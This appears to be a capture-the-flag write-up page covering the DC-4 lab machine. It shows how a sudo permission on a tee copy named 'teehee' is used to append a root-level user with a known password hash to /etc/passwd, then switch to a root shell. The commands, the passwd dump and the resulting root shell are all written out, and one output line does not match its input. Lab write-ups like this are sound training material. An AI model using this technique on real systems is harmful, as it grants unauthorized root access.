---
layout: default
title: Tee
parent: Sudo
nav_order: 3
---

# Tee(hee)

---

## Check Sudo Permissions

```bash
charles@dc-4:/home/jim$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee

```

## Exploit Sudo Permissions on /usr/bin/teehee

According to GTFOBins we can exploit _tee_ which we can check to see if _teehee_ is the same binary.

![gtfobins](../../../../assets/images/ctfs/proving_grounds/dc_4/gtfobins.png)

```bash
charles@dc-4:/home/jim$ echo "evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
kamino:$/UTMXpPC/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash

```

Checking _/etc/passwd_ we have added the _evil_ user with root privileges.

```bash
charles@dc-4:/home/jim$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

We can switch to the Evil user and gain a shell with root privileges.

```bash
charles@dc-4:/home/jim$ su evil
Password:
root@dc-4:/home/jim# id
uid=0(root) gid=0(root) groups=0(root)

```
